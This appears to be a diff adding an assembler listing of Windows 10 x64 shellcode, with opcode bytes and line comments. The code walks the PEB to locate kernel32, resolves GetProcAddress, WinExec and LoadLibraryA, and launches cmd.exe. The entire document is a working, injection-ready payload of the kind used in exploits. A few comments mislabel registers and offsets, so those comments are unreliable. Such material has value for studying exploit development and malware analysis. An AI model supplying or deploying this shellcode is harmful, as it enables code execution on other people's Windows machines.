@@ -1,0 +1,111 @@
+     1                                  ;Assembly language -> nasm x64
+     2                                  ;Shellcode for Win10 x64 -> call command line
+     3 00000000 4831C9                  xor rcx, rcx                           ; RCX = 0                                  
+     4 00000003 65488B4160              mov rax, gs:[rcx + 0x60]               ; RAX = [TEB + 0x60] = &PEB                                 
+     5 00000008 488B4018                mov rax, [rax + 0x18]                  ; RAX = [PEB + 0x18] = PEB_LDR_DATA                          
+     6 0000000C 488B7020                mov rsi, [rax + 0x20]                  ; RSI = [PEB_LDR_DATA + 0x10] = LDR_MODULE InLoadOrder[0] (process)                
+     7 00000010 48AD                    lodsq                                  ; RAX = InLoadOrder[1] (ntdll)                     
+     8 00000012 4896                    xchg rax, rsi                          ; RAX = RSI, RSI = RAX                    
+     9 00000014 48AD                    lodsq                                  ; RAX = InLoadOrder[2] (kernel32)                    
+    10 00000016 488B5820                mov rbx, [rax + 0x20]                  ; RBX = [InLoadOrder[2] + 0x20] = kernel32 DllBase                      
+    11                                  
+    12 0000001A 4D31C0                  xor r8, r8                             ; Clear r8                                 
+    13 0000001D 448B433C                mov r8d, [rbx + 0x3c]                  ; R8D = DOS->e_lfanew offset                
+    14 00000021 4C89C2                  mov rdx, r8                            ; RDX = DOS->e_lfanew                      
+    15 00000024 4801DA                  add rdx, rbx                           ; RDX = PE Header                          
+    16 00000027 4831C9                  xor rcx, rcx                           ; RCX = 0                                  
+    17 0000002A B188                    mov cl, 0x88                           ; RCX = 0x88 - Offset export table         
+    18 0000002C 4801D1                  add rcx, rdx                           ; RCX = PE Header + Offset export table
+    19 0000002F 448B01                  mov r8d, [rcx]                         ; R8D = Offset export table                
+    20 00000032 4901D8                  add r8, rbx                            ; R8 = Export table                        
+    21 00000035 4831F6                  xor rsi, rsi                           ; Clear RSI                               
+    22 00000038 418B7020                mov esi, [r8 + 0x20]                   ; RSI = Offset namestable               
+    23 0000003C 4801DE                  add rsi, rbx                           ; RSI = Names table                   
+    24 0000003F 4831C9                  xor rcx, rcx                           ; RCX = 0 
+    25 00000042 49B947657450726F63-     mov r9, 0x41636f7250746547             ; R9 = AcorPteG                                  
+    25 0000004B 41                 
+    26                                  
+    27                                  ;Get GetProcAddress Function
+    28                                  Get_Function:                                                                     
+    29 0000004C 48FFC1                  inc rcx                                ; Increment the ordinal                     
+    30 0000004F 4831C0                  xor rax, rax                           ; RAX = 0                                  
+    31 00000052 8B048E                  mov eax, [rsi + rcx * 4]               ; Get name offset                           
+    32 00000055 4801D8                  add rax, rbx                           ; Get function name                        
+    33 00000058 4C3908                  cmp [rax], r9                          ; AcorPteG ?                                
+    34 0000005B 75EF                    jnz Get_Function                                                                   
+    35 0000005D 4831F6                  xor rsi, rsi                           ; RSI = 0                                   
+    36 00000060 418B7024                mov esi, [r8 + 0x24]                   ; ESI = Offset ordinals                    
+    37 00000064 4801DE                  add rsi, rbx                           ; RSI = Ordinals table                      
+    38 00000067 668B0C4E                mov cx, [rsi + rcx * 2]                ; Number of function                        
+    39 0000006B 4831F6                  xor rsi, rsi                           ; RSI = 0                                   
+    40 0000006E 418B701C                mov esi, [r8 + 0x1c]                   ; Offset address table                      
+    41 00000072 4801DE                  add rsi, rbx                           ; ESI = Address table                       
+    42 00000075 4831D2                  xor rdx, rdx                           ; RDX = 0                                   
+    43 00000078 8B148E                  mov edx, [rsi + rcx * 4]               ; EDX = Pointer(offset)                     
+    44 0000007B 4801DA                  add rdx, rbx                           ; RDX = GetProcAddress                      
+    45 0000007E 4889D7                  mov rdi, rdx                           ; RDI = GetProcAddress                
+    46                                  
+    47                                  ;Get WinExec Proc
+    48 00000081 57                      push rdi							   ; GetProcAddress -> STACK
+    49 00000082 53                      push rbx							   ; Kernel32 Dll Base -> STACK
+    50 00000083 48B9FF57696E457865-     mov rcx, 0x636578456e6957ff			   ; \xff,cexEniW
+    50 0000008C 63                 
+    51 0000008D 48C1E908                shr rcx, 8							   ; \x00,cexEniW
+    52 00000091 51                      push rcx							   ; RCX -> STACK
+    53 00000092 4889D9                  mov rcx, rbx                           ; Kernel32 Dll Base [First]
+    54 00000095 4889E2                  mov rdx, rsp                           ; WinExec [Second]                          
+    55 00000098 4883EC30                sub rsp, 0x30						   ; RSP = RSP - 8*6                                                                                 
+    56 0000009C FFD7                    call rdi                               ; GetProcAddress   
+    57 0000009E 4883C430                add rsp, 0x30                          ; RSP = RSP + 8*6                                                              
+    58 000000A2 4883C408                add rsp, 0x8                           ; RSP = RSP + 8*1
+    59 000000A6 4889C6                  mov rsi, rax                           ; RSI = WinExec
+    60 000000A9 5B                      pop rbx								   ; RBX = GetProcAddress
+    61 000000AA 5F                      pop rdi         					   ; RDI = Kernel32 Dll Base
+    62                                  
+    63                                  ;Call C:\Windows\System32\cmd.exe
+    64 000000AB 56                      push rsi							   ; WinExec -> STACK
+    65 000000AC 57                      push rdi							   ; Kernel32 Dll Base -> STACK
+    66 000000AD 53                      push rbx							   ; GetProcAddress -> STACK
+    67 000000AE 48B9FFFFFFFFFF6578-     mov rcx, 0x657865ffffffffff			   ; RCX = exe,\xff,\xff,\xff,\xff,\xff,\xff
+    67 000000B7 65                 
+    68 000000B8 48C1E928                shr rcx, 40							   ; RCX = \x00,\x00,\x00,\x00,\x00,exe
+    69 000000BC 51                      push rcx							   ; RCX -> STACK
+    70 000000BD 48B96D33325C636D64-     mov rcx, 0x2e646d635c32336d			   ; RCX = .dmc\23m
+    70 000000C6 2E                 
+    71 000000C7 51                      push rcx                               ; RCX -> STACK
+    72 000000C8 48B977735C53797374-     mov rcx, 0x65747379535c7377            ; RCX = etsyS\sw
+    72 000000D1 65                 
+    73 000000D2 51                      push rcx							   ; RCX -> STACK
+    74 000000D3 48B9433A5C57696E64-     mov rcx, 0x6f646e69575c3a43            ; RCX = odniW\:C
+    74 000000DC 6F                 
+    75 000000DD 51                      push rcx							   ; RCX -> STACK
+    76 000000DE 4889E1                  mov rcx, rsp						   ; RCX -> \x00,exe.dmc\23metsyS\swodniW\:C -> [First]
+    77 000000E1 4831D2                  xor rdx, rdx						   ; 0 -> [Second] 
+    78 000000E4 4883EC30                sub rsp, 0x30						   ; RSP = RSP - 8*6 
+    79 000000E8 FFD6                    call rsi                               ; WinExec
+    80 000000EA 4883C430                add rsp, 0x30                          ; RSP = RSP + 8*6
+    81 000000EE 4883C420                add rsp, 0x20                          ; RSP = RSP + 8*4 
+    82 000000F2 5B                      pop rbx								   ; RBX = GetProcAddress
+    83 000000F3 5F                      pop rdi								   ; RDI = Kernel32 Dll Base
+    84 000000F4 5E                      pop rsi								   ; RSI = WinExec
+    85                                  
+    86                                  ;Get LoadLibraryA Proc
+    87 000000F5 56                      push rsi							   ; WinExec -> STACK
+    88 000000F6 57                      push rdi							   ; Kernel32 Dll Base -> STACK
+    89 000000F7 53                      push rbx							   ; GetProcAddress -> STACK
+    90 000000F8 B961727941              mov ecx, 0x41797261                    ; RCX = \x00,\x00,\x00,\x00,Ayra                                      
+    91 000000FD 51                      push rcx                               ; RCX -> STACK                        
+    92 000000FE 48B94C6F61644C6962-     mov rcx, 0x7262694c64616f4c            ; RCX = rbiLdaoL                           
+    92 00000107 72                 
+    93 00000108 51                      push rcx                               ; RCX -> STACK  
+    94 00000109 4889D9                  mov rcx, rbx                           ; RCX = Kernel32 Dll Base [First]                           
+    95 0000010C 4889E2                  mov rdx, rsp                           ; RDX -> \x00,AyrarbiLdaoL [Second]                                          
+    96 0000010F 4883EC30                sub rsp, 0x30						   ; RSP = RSP - 8*6                                                                     
+    97 00000113 FFD7                    call rdi                               ; GetProcAddress                            
+    98 00000115 4883C430                add rsp, 0x30                          ; RSP = RSP + 8*6                                          
+    99 00000119 4883C410                add rsp, 0x10                          ; RSP = RSP + 8*2       
+   100 0000011D 4989C1                  mov r9, rax                            ; R9 = LoadLibraryA
+   101 00000120 5B                      pop rbx								   ; RBX = GetProcAddress
+   102 00000121 5F                      pop rdi								   ; RDI = Kernel32 Dll Base
+   103 00000122 5E                      pop rsi								   ; RSI = WinExec
+   104 00000123 C3                      ret
